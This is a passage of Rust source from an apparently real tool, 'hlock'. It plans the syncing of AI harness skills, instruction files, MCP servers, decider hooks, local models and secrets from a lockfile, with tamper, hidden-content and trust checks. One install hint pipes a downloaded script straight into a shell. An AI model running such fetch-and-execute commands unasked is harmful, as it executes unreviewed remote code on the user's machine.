        if matches!(s.origin.as_str(), "harness-builtin" | "bundled") {
            continue; // provided by the harness / its plugins
        }
        let Some(path) = &s.path else { continue };
        if !fsutil::plain_name(&s.name) {
            steps.push(refused(format!("skill:{}", s.name), "skill", format!("Skill {:?}", s.name), "its name isn't a plain directory name".into()));
            continue;
        }
        let mut dest = expand(path, &root, &t);
        let outside_root = !path.starts_with("{root}") && (path.starts_with('~') || Path::new(path).is_absolute());
        if mode != "home" && outside_root {
            if let Some(w) = &write_dir {
                dest = w.join(&s.name);
            }
        }
        if !under_any(&dest, &skill_dirs) {
            steps.push(refused(format!("skill:{}", s.name), "skill", format!("Skill {} → {}", s.name, pretty(&dest, ctx)), format!("{path} is outside {}'s skill directories", profile.name)));
            continue;
        }
        locked_skill_dirs.insert(dest.clone());
        let ok = dest.join("SKILL.md").is_file() && Some(tree_digest(&dest)) == s.digest;
        let shown = pretty(&dest, ctx);
        let mut step = Step { id: format!("skill:{}", s.name), kind: "skill".into(), title: format!("{} → {shown}", s.name), ..Default::default() };
        if ok {
            step.reason = "matches the lock".into();
        } else if s.dep.declared && s.dep.commit.is_some() {
            // a declared dependency is fetched at its commit, never vendored
            step = fetch_dep_step(step, crate::deps::Entry::Skill(s.clone()), dest, &lock_dir, lock, ctx, opts);
        } else if let Some(v) = &s.vendored {
            let refuse = |from: &Path| tampered(from, s.digest.as_ref()).or_else(|| hidden(from, v, s.scan.as_deref(), opts)).or_else(|| crate::trust::unlisted_scripts(&s.name, s.scripts.as_ref(), from));
            match vendored_path(&lock_dir, v) {
                Some(from) if refuse(&from).is_some() => {
                    step.status = "manual".into();
                    step.title = format!("Copy skill {} → {shown}", s.name);
                    step.reason = refuse(&from).unwrap_or_default();
                }
                Some(from) => {
                    step.status = "auto".into();
                    step.title = format!("Copy skill {} → {shown}", s.name);
                    step.action = Some(Action::CopyDir { from, to: dest });
                }
                None => {
                    step.status = "manual".into();
                    step.reason = format!("its vendored copy {v:?} isn't a path inside the lock's directory; refusing to copy it");
                }
            }
        } else if let Some(src) = s.source.as_deref().and_then(|x| x.strip_prefix("git+")) {
            let (url, commit, sub) = split_git_source(src);
            let has_git = ctx.which("git").is_some();
            step.title = format!("Fetch skill {} from {url}@{}", s.name, fsutil::prefix_chars(commit, 10));
            step.command = Some(format!("git clone -- {} <clone> && git -C <clone> checkout {}  # then copy {}", fsutil::shell_quote(url), fsutil::shell_quote(commit), fsutil::shell_quote(sub)));
            match git_source_problem(url, commit, sub) {
                Some(why) => {
                    step.status = "manual".into();
                    step.reason = why;
                    step.command = None;
                }
                None => {
                    step.status = if has_git { "auto" } else { "manual" }.into();
                    step.reason = if has_git { String::new() } else { "needs git".into() };
                    step.action = has_git.then(|| Action::GitSkill { url: url.into(), commit: commit.into(), subpath: sub.into(), to: dest, name: s.name.clone(), scripts: s.scripts.clone() });
                }
            }
        } else {
            step.status = "manual".into();
            step.reason = if s.origin == "first-party" { "project skill missing or changed; it comes from the repo".into() } else { "no vendored copy or source to fetch it from".into() };
        }
        steps.push(step);
    }
    if opts.exact {
        if let Some(w) = &write_dir {
            for d in std::fs::read_dir(w).into_iter().flatten().flatten() {
                let p = d.path();
                if p.join("SKILL.md").is_file() && !locked_skill_dirs.contains(&p) {
                    steps.push(Step {
                        id: format!("skill-extra:{}", d.file_name().to_string_lossy()),
                        kind: "skill".into(),
                        title: format!("Remove skill {} (not in the lock)", d.file_name().to_string_lossy()),
                        status: "auto".into(),
                        reason: "--exact; moved aside to .hlock-bak".into(),
                        action: Some(Action::Remove { path: p }),
                        ..Default::default()
                    });
                }
            }
        }
    }

    // ---- instructions ----
    // where a lock may put an instruction file: exactly where the harness reads them
    let instruction_files: Vec<PathBuf> = profile.instructions.iter().map(|tpl| fsutil::normalize(&expand(tpl, &root, &t))).collect();
    // and, for a declared instruction file, the harness's rules directory
    let rules_dir = profile.rules.as_ref().map(|r| fsutil::normalize(&t.cwd.join(&r.dir)));
    for i in &lock.instructions {
        let dest = expand(&i.name, &root, &t);
        let id = format!("instructions:{}", i.name);
        // a declared file, or one the harness reads from its rules directory (a role's file)
        let in_rules = rules_dir.as_ref().is_some_and(|d| fsutil::normalize(&dest).parent() == Some(d.as_path()));
        if !instruction_files.contains(&fsutil::normalize(&dest)) && !in_rules {
            steps.push(refused(id, "instructions", format!("Write {}", pretty(&dest, ctx)), format!("{} isn't a file {} reads instructions from", i.name, profile.name)));
            continue;
        }
        let ok = std::fs::read(&dest).map(|b| Some(crate::hash::sha256_bytes(&b)) == i.digest).unwrap_or(false);
        let mut step = Step { id, kind: "instructions".into(), title: pretty(&dest, ctx), ..Default::default() };
        if ok {
            step.reason = "matches the lock".into();
        } else if i.dep.declared && i.dep.commit.is_some() {
            step = fetch_dep_step(step, crate::deps::Entry::Instructions(i.clone()), dest, &lock_dir, lock, ctx, opts);
        } else if let Some(v) = &i.vendored {
            match vendored_path(&lock_dir, v) {
                Some(from) if tampered(&from, i.digest.as_ref()).or_else(|| hidden(&from, v, i.scan.as_deref(), opts)).is_some() => {
                    step.status = "manual".into();
                    step.title = format!("Write {}", pretty(&dest, ctx));
                    step.reason = tampered(&from, i.digest.as_ref()).or_else(|| hidden(&from, v, i.scan.as_deref(), opts)).unwrap_or_default();
                }
                Some(from) => {
                    step.status = "auto".into();
                    step.title = format!("Write {}", pretty(&dest, ctx));
                    step.action = Some(Action::CopyFile { from, to: dest });
                }
                None => {
                    step.status = "manual".into();
                    step.reason = format!("its vendored copy {v:?} isn't a path inside the lock's directory; refusing to copy it");
                }
            }
        } else {
            step.status = "manual".into();
            step.optional = true;
            step.reason = "project instruction file differs from the lock; it comes from the repo".into();
        }
        steps.push(step);
    }

    // ---- subagents, scripts, middleware: each where the harness reads it ----
    let dirs_of = |spec: Option<&crate::profiles::ComponentDirs>| -> (Vec<PathBuf>, Vec<PathBuf>) {
        let dirs = spec.map(|s| s.dirs.iter().chain(s.write.iter()).map(|d| fsutil::normalize(&expand(d, &root, &t))).collect()).unwrap_or_default();
        let files = spec.map(|s| s.files.iter().map(|f| fsutil::normalize(&expand(f, &root, &t))).collect()).unwrap_or_default();
        (dirs, files)
    };
    let scripts_dir = fsutil::normalize(&t.cwd.join(crate::components::SCRIPTS_DIR));
    let kinds: [(&str, &Vec<crate::lockfile::FileComponent>, (Vec<PathBuf>, Vec<PathBuf>)); 3] = [
        ("subagent", &lock.subagent, dirs_of(profile.subagents.as_ref())),
        ("script", &lock.script, (vec![scripts_dir], Vec::new())),
        ("middleware", &lock.middleware, dirs_of(profile.middleware.as_ref())),
    ];
    for (kind, items, (dirs, files)) in kinds {
        for c in items.iter() {
            let id = format!("{kind}:{}", c.name);
            let dest = fsutil::normalize(&expand(&c.path, &root, &t));
            let allowed = files.contains(&dest) || dest.parent().is_some_and(|p| dirs.iter().any(|d| d == p) || (kind == "script" && p.starts_with(&dirs[0])));
            if !allowed {
                let why = if dirs.is_empty() && files.is_empty() { format!("{} has no place for a {kind}", profile.name) } else { format!("{} isn't where {} reads a {kind}", c.path, profile.name) };
                steps.push(refused(id, kind, format!("Write {}", pretty(&dest, ctx)), why));
                continue;
            }
            let ok = std::fs::read(&dest).map(|b| Some(crate::hash::sha256_bytes(&b)) == c.digest).unwrap_or(false);
            let mut step = Step { id, kind: kind.into(), title: pretty(&dest, ctx), ..Default::default() };
            if ok {
                step.status = "satisfied".into();
                step.reason = "matches the lock".into();
            } else if let Some(v) = &c.vendored {
                match vendored_path(&lock_dir, v) {
                    Some(from) if tampered(&from, c.digest.as_ref()).or_else(|| hidden(&from, v, c.scan.as_deref(), opts)).is_some() => {
                        step.status = "manual".into();
                        step.title = format!("Write {}", pretty(&dest, ctx));
                        step.reason = tampered(&from, c.digest.as_ref()).or_else(|| hidden(&from, v, c.scan.as_deref(), opts)).unwrap_or_default();
                    }
                    Some(from) => {
                        step.status = "auto".into();
                        step.title = format!("Write {}", pretty(&dest, ctx));
                        step.action = Some(Action::CopyFile { from, to: dest });
                    }
                    None => {
                        step.status = "manual".into();
                        step.reason = format!("its vendored copy {v:?} isn't a path inside the lock's directory; refusing to copy it");
                    }
                }
            } else {
                step.status = "manual".into();
                step.optional = true;
                step.reason = format!("the project's {kind} differs from the lock; it comes from the repo");
            }
            steps.push(step);
        }
    }

    // ---- MCP launchers ----
    let mut launchers = BTreeSet::new();
    for tool in lock.tool.iter().filter(|x| x.kind == "mcp" && x.enabled != Some(false)) {
        if let Some(cmd) = &tool.command {
            let bin = Path::new(cmd).file_name().map(|b| b.to_string_lossy().into_owned()).unwrap_or_default();
            if launchers.insert(bin.clone()) && !docker {
                let ok = ctx.which(cmd).is_some();
                let users: Vec<&str> = lock.tool.iter().filter(|x| x.command.as_deref() == Some(cmd)).map(|x| x.name.as_str()).collect();
                let hint = match bin.as_str() {
                    "npx" | "node" | "npm" => Some("install Node.js: https://nodejs.org (or: brew install node)"),
                    "uvx" | "uv" => Some("curl -LsSf https://astral.sh/uv/install.sh | sh"),
                    "docker" => Some("install Docker: https://docs.docker.com/get-docker/"),
                    _ => None,
                };
                steps.push(Step {
                    id: format!("mcp:{bin}"),
                    kind: "mcp".into(),
                    title: format!("`{bin}` for MCP servers: {}", users.join(", ")),
                    status: if ok { "satisfied" } else { "manual" }.into(),
                    reason: if ok { "on PATH".into() } else { format!("`{bin}` isn't on PATH") },
                    command: (!ok).then(|| hint.map(str::to_string)).flatten(),
                    verify: Some(format!("{bin} --version")),
                    ..Default::default()
                });
            }
        }
        for v in tool.env.values().chain(tool.headers.values()) {
            all_secrets.extend(placeholders(v));
        }
    }

    // ---- declared MCP servers ----
    for tool in lock.tool.iter().filter(|x| x.kind == "mcp" && x.dep.declared && x.enabled != Some(false)) {
        steps.push(mcp_dep_step(tool, profile, &t, ctx, ""));
    }

    // ---- [target] also: the portable declared dependencies, in more harnesses ----
    let mut notes = Vec::new();
    for other in &opts.also {
        let Some(op) = reg.harness(other).filter(|p| p.id != profile.id) else {
            if reg.harness(other).is_none() {
                notes.push(format!("[target] also names {other:?}, which isn't a harness hlock knows"));
            }
            continue;
        };
        let (ot, _, _) = target_ctx(op, ctx, opts);
        let tag = format!("{}: ", op.name);
        for s in lock.skill.iter().filter(|s| s.dep.declared && s.enabled) {
            let scope = s.scope.as_deref().unwrap_or("project");
            match crate::deps::skill_dest(op, scope, &s.name, &ot) {
                Ok((dest, _)) => {
                    let ok = dest.join("SKILL.md").is_file() && Some(tree_digest(&dest)) == s.digest;
                    let mut step = Step { id: format!("also:{}:skill:{}", op.id, s.name), kind: "skill".into(), title: format!("{tag}{} → {}", s.name, pretty(&dest, ctx)), ..Default::default() };
                    if ok {
                        step.reason = "matches the lock".into();
                    } else if s.dep.commit.is_some() || s.vendored.is_none() {
                        step = fetch_dep_step(step, crate::deps::Entry::Skill(s.clone()), dest, &lock_dir, lock, ctx, opts);
                        step.title = format!("{tag}{}", step.title);
                    } else if let Some((v, from)) = s.vendored.as_deref().and_then(|v| Some((v, vendored_path(&lock_dir, v)?))) {
                        match tampered(&from, s.digest.as_ref()).or_else(|| hidden(&from, v, s.scan.as_deref(), opts)).or_else(|| crate::trust::unlisted_scripts(&s.name, s.scripts.as_ref(), &from)) {
                            Some(why) => {
                                step.status = "manual".into();
                                step.reason = why;
                            }
                            None => {
                                step.status = "auto".into();
                                step.action = Some(Action::CopyDir { from, to: dest });
                            }
                        }
                    }
                    steps.push(step);
                }
                Err(e) => notes.push(format!("{tag}skill {}: {e}", s.name)),
            }
        }
        for i in lock.instructions.iter().filter(|i| i.dep.declared) {
            let name = crate::deps::decl_name_of(i);
            match crate::deps::instructions_dest(op, &i.scope, &name, &ot) {
                Ok((dest, _)) => {
                    let ok = std::fs::read(&dest).map(|b| Some(crate::hash::sha256_bytes(&b)) == i.digest).unwrap_or(false);
                    let mut step = Step { id: format!("also:{}:instructions:{name}", op.id), kind: "instructions".into(), title: format!("{tag}{}", pretty(&dest, ctx)), ..Default::default() };
                    if ok {
                        step.reason = "matches the lock".into();
                    } else if dest.is_file() && op.rules.is_none() {
                        step.status = "manual".into();
                        step.reason = format!("{} reads instructions only from this file, which already exists", op.name);
                    } else {
                        step = fetch_dep_step(step, crate::deps::Entry::Instructions(i.clone()), dest, &lock_dir, lock, ctx, opts);
                        step.title = format!("{tag}{}", step.title);
                    }
                    steps.push(step);
                }
                Err(e) => notes.push(format!("{tag}instructions {name}: {e}")),
            }
        }
        for tool in lock.tool.iter().filter(|x| x.kind == "mcp" && x.dep.declared && x.enabled != Some(false)) {
            let mut step = mcp_dep_step(tool, op, &ot, ctx, &tag);
            step.id = format!("also:{}:{}", op.id, step.id);
            steps.push(step);
        }
        if lock.native.iter().any(|n| n.dep.declared) || lock.config.iter().any(|c| c.restore != "record") {
            notes.push(format!("{}: plugins, settings and hooks stay with {}; only skills, MCP servers and instruction files are installed here", op.name, profile.name));
        }
        if lock.evidence.trials > 0 {
            notes.push(format!("{}: the lock's evidence was measured on {}, not here", op.name, profile.name));
        }
    }

    // ---- runtimes and models ----
    let used: BTreeSet<(String, String)> = lock.llm.iter().filter_map(|l| l.runtime.clone().map(|r| (r, l.model.clone()))).collect();
    for rt in &lock.runtime {
        steps.extend(runtime_steps(rt, &used, reg, ctx, opts, docker));
    }

    // ---- deciders: hooks, keys, local models ----
    steps.extend(decider_steps(lock, lock_path, profile, reg, &t, ctx, opts, &sync_cmd));

    // ---- secrets ----
    for r in &lock.secret {
        if !all_secrets.contains(&r.name) {
            continue;
        }
        let missing = missing_secrets.contains(&r.name);
        let found = if docker || missing { None } else { secrets::lookup(&r.name, ctx) };
        let short = r.name.trim_start_matches(secrets::PREFIX);
        steps.push(Step {
            id: format!("secret:{}", r.name),
            kind: "secret".into(),
            title: format!("{} ({})", r.name, r.used_by),
            status: if missing && !docker { "manual" } else { "satisfied" }.into(),
            reason: if docker {
                format!("supplied when the container starts (`docker run -e` or /run/secrets/{})", r.name)
            } else if let Some(f) = found {
                format!("from the {}", f.source)
            } else if !missing {
                "kept the value already configured here".into()
            } else {
                "not set".into()
            },
            command: (missing && !docker).then(|| format!("hlock secret set {short}   # or export {}=…, then re-run {sync_cmd}", r.name)),
            ..Default::default()
        });
    }

    // ---- policy: a denied source, server, provider or harness stops the sync ----
    let policy = crate::policy::Policy::for_lock(lock_path, ctx)?;
    notes.extend(policy.enforce(policy.check_lock(lock), &pretty(lock_path, ctx))?);

    // ---- executables: nothing that runs is installed until it's trusted here ----
    let store = crate::trust::TrustStore::load(ctx)?;
    let mut executables = crate::trust::assess(lock, &lock_dir, Some(profile), ctx, &policy, &store);
    if opts.trust {
        for e in executables.iter_mut().filter(|e| e.status == "untrusted") {
            e.status = "trusted".into();
        }
    }
    let blocked = crate::trust::blocked_steps(&executables);
    for st in steps.iter_mut() {
        // `also:HARNESS:skill:x` installs what `skill:x` does, in another harness
        let base = st.id.strip_prefix("also:").and_then(|r| r.split_once(':')).map(|(_, b)| b).unwrap_or(&st.id);
        let Some(es) = blocked.get(base) else { continue };
        // only what would run is gated; a step refused for another reason keeps that reason
        if st.status != "auto" {
            continue;
        }
        let denied = es.iter().any(|e| e.status == "denied");
        let what: Vec<String> = es.iter().map(|e| format!("{} {}{}", e.kind, e.name, e.via.as_deref().map(|v| format!(" (via {v})")).unwrap_or_default())).collect();
        st.status = "manual".into();
        st.action = None;
        st.reason = if denied { format!("you denied {} on this machine (hlock trust to change that)", what.join(", ")) } else { format!("⚑ runs {}, not yet trusted: approve with hlock trust, or sync --trust", what.join(", ")) };
    }

    Ok(Plan {
        harness: profile.id.clone(),
        harness_name: profile.name.clone(),
        binary: profile.binaries.first().cloned(),
        version: lock.harness.version.clone(),
        mode,
        root,
        isolation,
        prefix,
        env,
        steps,
        notes,
        executables,
    })
}

/// A step that fetches a declared dependency at its commit into `dest`. A lock pulled
/// from someone else may only name an http(s), ssh or git remote.
fn fetch_dep_step(mut step: Step, entry: crate::deps::Entry, dest: PathBuf, lock_dir: &Path, lock: &Lockfile, ctx: &Ctx, opts: &SyncOptions) -> Step {
    let kind = if entry.kind() == crate::deps::Kind::Instructions { crate::deps::Kind::Instructions } else { crate::deps::Kind::Skill };
    let src = entry.source().map(|s| crate::deps::parse(s, kind));
    let commit = entry.dep().commit.clone().unwrap_or_default();
    let name = match &entry {
        crate::deps::Entry::Instructions(i) => crate::deps::decl_name_of(i),
        e => e.name().to_string(),
    };
    let what = format!("{} {name}", entry.kind());
    step.title = format!("Fetch {what} → {}", pretty(&dest, ctx));
    match src {
        Some(Ok(crate::deps::Source::Git(g))) => {
            step.command = Some(format!("git clone -- {} <clone> && git -C <clone> checkout {}", fsutil::shell_quote(&g.url), fsutil::shell_quote(&commit)));
            if lock.pulled.is_some() {
                if let Some(why) = git_source_problem(&g.url, &commit, g.subpath.as_deref().unwrap_or("")) {
                    step.status = "manual".into();
                    step.reason = why;
                    return step;
                }
            }
            let stored = entry.digest().and_then(|d| crate::deps::stored(lock_dir, d));
            let scan = match &entry {
                crate::deps::Entry::Skill(s) => s.scan.clone(),
                crate::deps::Entry::Instructions(i) => i.scan.clone(),
                _ => None,
            };
            if let Some(why) = stored.as_ref().and_then(|p| hidden(p, &pretty(&dest, ctx), scan.as_deref(), opts)) {
                step.status = "manual".into();
                step.reason = why;
                return step;
            }
            let stored = stored.is_some();
            if !stored && ctx.which("git").is_none() {
                step.status = "manual".into();
                step.reason = "needs git".into();
                return step;
            }
            step.status = "auto".into();
            step.reason = if stored { "from the store".into() } else { format!("at {}", entry.dep().resolved_tag.clone().unwrap_or_else(|| fsutil::prefix_chars(&commit, 10).to_string())) };
            let allowed = crate::audit::allowed(scan.as_deref());
            step.action = Some(Action::FetchDep { entry: Box::new(entry), to: dest, project: lock_dir.to_path_buf(), allow_hidden: opts.allow_hidden.clone(), allowed });
        }
        Some(Ok(_)) => {
            step.status = "manual".into();
            step.reason = "comes from a path; it comes with the project".into();
        }
        Some(Err(e)) => {
            step.status = "manual".into();
            step.reason = format!("its source can't be fetched: {e}");
        }
        None => {
            step.status = "manual".into();
            step.reason = "has no source to fetch it from".into();
        }
    }
    step
}

/// A step that configures a declared MCP server in `profile`'s config for `t`.
fn mcp_dep_step(tool: &crate::lockfile::Tool, profile: &HarnessProfile, t: &Ctx, ctx: &Ctx, tag: &str) -> Step {
    let id = format!("mcp-dep:{}", tool.name);
    let scope = tool.scope.as_deref().unwrap_or("project");
    let mut step = Step { id, kind: "mcp".into(), title: format!("{tag}MCP server {}", tool.name), ..Default::default() };
    // a server a package brings is gated like any executable (see `plan`): approve it, and it's configured
    if tool.command.is_none() && tool.url.is_none() {
        step.status = "manual".into();
        step.reason = format!("{} names a server hlock can't configure by itself; add it by hand", tool.source.as_deref().unwrap_or("its source"));
        return step;
    }
    match crate::deps::mcp_dest(profile, scope, t) {
        Ok(dest) => {
            let entry = crate::deps::mcp_entry(tool, &dest.shape);
            let have = read_config(&dest.path, &dest.format).ok().flatten().and_then(|d| d.pointer(&format!("{}/{}", dest.pointer, crate::capture::escape_pointer(&tool.name))).cloned());
            // the same server with a secret filled in is still the same server
            let same = have.as_ref().is_some_and(|h| h == &entry || crate::capture::mcp_tool(&tool.name, h, scope).is_some_and(|x| x.command == tool.command && x.args == tool.args && x.url == tool.url));
            step.title = format!("{tag}MCP server {} in {}", tool.name, pretty(&dest.path, ctx));
            if same {
                step.reason = "configured".into();
            } else {
                step.status = "auto".into();
                step.action = Some(Action::WriteMcp { dest, name: tool.name.clone(), entry });
            }
        }
        Err(e) => {
            step.status = "manual".into();
            step.reason = e.to_string();
        }
    }
    step
}

/// Steps for a lock's deciders: write the hooks hlock wires them in with (and remove
/// stale ones), and check each one's API key or local model.
#[allow(clippy::too_many_arguments)]
fn decider_steps(lock: &Lockfile, lock_path: &Path, profile: &HarnessProfile, reg: &Registry, t: &Ctx, ctx: &Ctx, opts: &SyncOptions, sync_cmd: &str) -> Vec<Step> {
    let mut steps = Vec::new();
    let bin = ctx.var("HLOCK_BIN").unwrap_or("hlock").to_string();
    let lock_abs = if lock_path.is_absolute() { lock_path.to_path_buf() } else { ctx.cwd.join(lock_path) };
    let mut specs: BTreeMap<String, crate::profiles::HookSpec> = BTreeMap::new();
    for w in profile.deciders.values() {
        if let Some(h) = &w.hook {
            specs.insert(h.target(), h.clone());
        }
    }
    for (target, h) in specs {
        let path = match &h.path {
            Some(p) => expand(p, &profile.config_root(t), t),
            None => match profile.file_path(&h.file, t) {
                Some(p) => p,
                None => continue,
            },
        };
        let uses: BTreeSet<&str> = lock.decider.iter().filter(|d| d.via == "hook" && d.wiring.iter().any(|w| w.file == target)).map(|d| d.use_.as_str()).collect();
        let shown = pretty(&path, ctx);
        let wire = |what: &str| format!("Wire deciders ({}) into {what}", uses.iter().copied().collect::<Vec<_>>().join(", "));
        // wiring hlock won't write: a use or event that isn't one a hook answers
        let problems = crate::decide::hook_problems(lock, &target, &h.format);
        if !problems.is_empty() {
            steps.push(refused(format!("decider-skip:{target}"), "decider", format!("Deciders hlock can't wire into {shown}"), problems.join("; ")));
        }
        if h.owned() {
            // a file hlock owns: a plugin, or Copilot's hook file
            let desired = crate::decide::owned_hook_file(lock, &target, &h.format, &bin, &lock_abs);
            let actual = std::fs::read_to_string(&path).ok();
            let ours = actual.as_deref().is_some_and(|a| a.contains(crate::decide::HOOK_MARK));
            if desired.is_none() && !ours {
                continue;
            }
            let same = desired == actual;
            let title = match &desired {
                Some(_) => wire(&shown),
                None => format!("Remove {shown}, hlock's decider hooks"),
            };
            steps.push(Step {
                id: format!("decider:{target}"),
                kind: "decider".into(),
                title,
                status: if same { "satisfied" } else { "auto" }.into(),
                reason: if same { "matches the lock".into() } else if h.format == "copilot" { "in the repository: Copilot reads hooks only there".into() } else { String::new() },
                action: (!same).then(|| match desired {
                    Some(content) => Action::WriteFile { path: path.clone(), content },
                    None => Action::Remove { path: path.clone() },
                }),
                ..Default::default()
            });
            continue;
        }
        let fmt = profile.files.get(&h.file).filter(|_| h.path.is_none()).map(|f| if f.format == "jsonc" { "json".to_string() } else { f.format.clone() }).unwrap_or_else(|| "json".into());
        let pointer = h.pointer.clone().unwrap_or_else(|| "/hooks".into());
        let entries = crate::decide::hook_entries(lock, &target, &h.format, &bin, &lock_abs);
        let actual = read_config(&path, &fmt).ok().flatten();
        let has_ours = actual.as_ref().is_some_and(|a| {
            let mut c = a.clone();
            crate::decide::strip_hooks(&mut c)
        });
        if entries.is_empty() && !has_ours {
            continue;
        }
        let mut desired = actual.clone().unwrap_or_else(|| json!({}));
        crate::decide::merge_hooks(&mut desired, &pointer, &entries);
        // Cursor's hooks file needs a version
        let mut set = serde_json::Map::new();
        if h.format == "cursor" && !entries.is_empty() && desired.get("version").is_none() {
            set.insert("version".into(), json!(1));
        }
        for (k, v) in &set {
            desired[k.as_str()] = v.clone();
        }
        let same = actual.as_ref() == Some(&desired);
        let title = if entries.is_empty() { format!("Remove hlock's decider hooks from {shown}") } else { wire(&shown) };
        steps.push(Step {
            id: format!("decider:{target}"),
            kind: "decider".into(),
            title,
            status: if same { "satisfied" } else { "auto" }.into(),
            reason: if same { "hooks match the lock".into() } else { String::new() },
            action: (!same).then(|| Action::WriteHooks { path: path.clone(), format: fmt.clone(), pointer: pointer.clone(), entries: Value::Object(entries.clone()), set }),
            ..Default::default()
        });
    }
    let var = |k: &str| ctx.var(k).map(str::to_string);
    // the API key each hosted decider needs, once per variable
    let mut keys: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for d in lock.decider.iter().filter(|d| d.runtime.is_none() && crate::decide::needs_key(&d.provider)) {
        // the provider's own variable: a lock's `key-env` isn't trusted (decide::entry_config)
        if let Some(k) = crate::decide::entry_key_env(d, crate::decide::own_spec(&ctx.cwd, &d.use_).as_ref()) {
            keys.entry(k).or_default().push(format!("{} ({}:{})", d.use_, d.provider, d.model));
        }
    }
    for (k, users) in keys {
        let set = ctx.var(&k).is_some_and(|v| !v.is_empty());
        steps.push(Step {
            id: format!("decider-key:{k}"),
            kind: "decider".into(),
            title: format!("{k} for the {} decider{}", users.join(", "), if users.len() == 1 { "" } else { "s" }),
            status: if set { "satisfied" } else { "manual" }.into(),
            reason: if set { "set".into() } else { "not set; the hooks defer to the harness until it is".into() },
            command: (!set).then(|| format!("export {k}=…   # then re-run {sync_cmd}")),
            ..Default::default()
        });
    }
    for d in &lock.decider {
        let Some(rt) = &d.runtime else { continue };
        let id = format!("decider-model:{}", d.use_);
        let title = format!("{} on {rt} (the {} decider)", d.model, d.use_);
        // only a runtime hlock knows serves deciders, through its own pull command
        let Some(rp) = reg.runtime(rt).filter(|p| crate::decide::provider(&p.id).is_some_and(|x| x.5.runtime)) else {
            steps.push(refused(id, "model", title, format!("{rt:?} isn't a local runtime hlock knows")));
            continue;
        };
        if !fsutil::plain_token(&d.model) {
            steps.push(refused(id, "model", title, format!("the model {:?} has characters that aren't allowed", d.model)));
            continue;
        }
        let cfg = crate::decide::entry_config(d);
        // ask only a server on this machine, or the one this machine's environment names
        let here = |ep: &crate::decide::Endpoint| {
            crate::decide::is_loopback(&ep.base_url) || crate::decide::provider(&d.provider).and_then(|p| var(p.3)).is_some_and(|u| ep.base_url.trim_end_matches('/') == u.trim_end_matches('/'))
        };
        let present = cfg.endpoint(&var).ok().filter(here).is_some_and(|ep| {
            let url = format!("{}/api/tags", ep.base_url.trim_end_matches('/'));
            let agent: ureq::Agent = ureq::Agent::config_builder().timeout_global(Some(Duration::from_millis(500))).build().into();
            agent.get(&url).call().ok().and_then(|mut r| r.body_mut().read_to_string().ok()).is_some_and(|t| {
                serde_json::from_str::<Value>(&t).ok().is_some_and(|v| {
                    v["models"].as_array().into_iter().flatten().any(|m| m["name"].as_str().is_some_and(|n| n == d.model || n.trim_end_matches(":latest") == d.model))
                })
            })
        });
        // the profile's pull command (`ollama pull {model}`), one word per argument
        let argv: Option<Vec<String>> = rp.pull.as_ref().map(|p| p.split_whitespace().map(|w| if w == "{model}" { d.model.clone() } else { w.to_string() }).collect());
        let Some(argv) = argv.filter(|a| !a.is_empty() && !a.iter().any(|w| w.starts_with('{'))) else {
            steps.push(refused(id, "model", title, format!("{} has no pull command for it", rp.name)));
            continue;
        };
        let can = ctx.which(&argv[0]).is_some();
        let auto = !present && opts.pull && can;
        steps.push(Step {
            id,
            kind: "model".into(),
            title,
            status: if present { "satisfied" } else if auto { "auto" } else { "manual" }.into(),
            reason: if present { "pulled and served".into() } else if can { format!("not served by a running {rt}") } else { format!("needs `{}`, which isn't on PATH", argv[0]) },
            action: auto.then(|| Action::Run { argv: argv.clone(), env: BTreeMap::new() }),
            command: (!present).then(|| shell_join(&argv)),
            ..Default::default()
        });
    }
    steps
}

/// Isolated by default: without `in_place` or `docker`, a plan writes under the
/// lock's `.hlock/env` prefix.
fn isolated(opts: &SyncOptions, lock_path: &Path, ctx: &Ctx) -> SyncOptions {
    let mut o = opts.clone();
    if o.prefix.is_none() && o.docker.is_none() && !o.in_place {
        o.prefix = Some(crate::launch::env_prefix(lock_path, ctx));
    }
    o
}

/// With `opts.inject`: the secret values behind the environment references a plan
/// writes, keyed by variable, to pass in the harness's environment; and the
/// secrets that have no value. Values come from [`secrets::lookup`], else from the
/// user's own config on the machine that pinned the lock.
pub fn secret_env(lock: &Lockfile, lock_path: &Path, reg: &Registry, ctx: &Ctx, opts: &SyncOptions) -> Result<(BTreeMap<String, String>, BTreeSet<String>)> {
    let mut values = BTreeMap::new();
    let mut missing = BTreeSet::new();
    if !opts.inject || opts.in_place || opts.docker.is_some() {
        return Ok((values, missing));
    }
    let profile = reg.require_harness(&lock.harness.name)?;
    let (t, _, _) = target_ctx(profile, ctx, &isolated(opts, lock_path, ctx));
    let lock_dir = lock_dir_of(lock_path, ctx);
    let resolve = resolver(ctx);
    for c in lock.config.iter().filter(|c| c.restore != "record") {
        let (Some(vend), Some(tpl)) = (&c.vendored, profile.files.get(&c.id).and_then(|f| f.env_ref.as_deref())) else { continue };
        let Some(target) = profile.file_path(&c.id, &t) else { continue };
        let fallback = profile.file_path(&c.id, ctx);
        let d = desired_config(&lock_dir.join(vend), &c.format, &c.pointers, &target, fallback.as_deref(), &resolve, Some(tpl))?;
        values.extend(d.values);
        missing.extend(d.missing);
    }
    missing.retain(|n| !values.contains_key(n));
    Ok((values, missing))
}

fn native_step(n: &Native, profile: &HarnessProfile, t: &Ctx, root: &Path, env: BTreeMap<String, String>, opts: &SyncOptions, ctx: &Ctx) -> Option<Step> {
    let kind = n.kind.rsplit('.').next().unwrap_or(&n.kind);
    let bin = profile.binaries.first().cloned().unwrap_or_default();
    let have_bin = ctx.which(&bin).is_some();
    let mut s = Step { id: format!("{}:{}", n.kind, n.name), kind: "plugin".into(), ..Default::default() };
    let vtxt = n.version.as_deref().map(|v| format!(" {v}")).unwrap_or_default();
    // names and sources become arguments of an install command: never an option
    if let Some(bad) = [Some(n.name.as_str()), n.source.as_deref(), n.version.as_deref()].into_iter().flatten().find(|v| v.is_empty() || v.starts_with('-') || v.chars().any(char::is_control)) {
        return Some(refused(s.id, "plugin", format!("{} {}{vtxt}", n.kind, n.name), format!("{bad:?} isn't a name, version or source hlock passes to an installer")));
    }
    match (profile.id.as_str(), kind) {
        ("claude-code", "marketplace") => {
            let known = read_config(&root.join("plugins/known_marketplaces.json"), "json").ok().flatten().unwrap_or_default();
            s.title = format!("Claude Code marketplace {}", n.name);
            if known.get(&n.name).is_some() {
                s.reason = "added".into();
                return Some(s);
            }
            let src = n.source.as_deref().unwrap_or("");
            let arg = src.strip_prefix("github:").or_else(|| src.strip_prefix("git+")).or_else(|| src.strip_prefix("path:")).unwrap_or(src).to_string();
            let argv = vec![bin.clone(), "plugin".into(), "marketplace".into(), "add".into(), arg];
            s.title = format!("Add Claude Code marketplace {}", n.name);
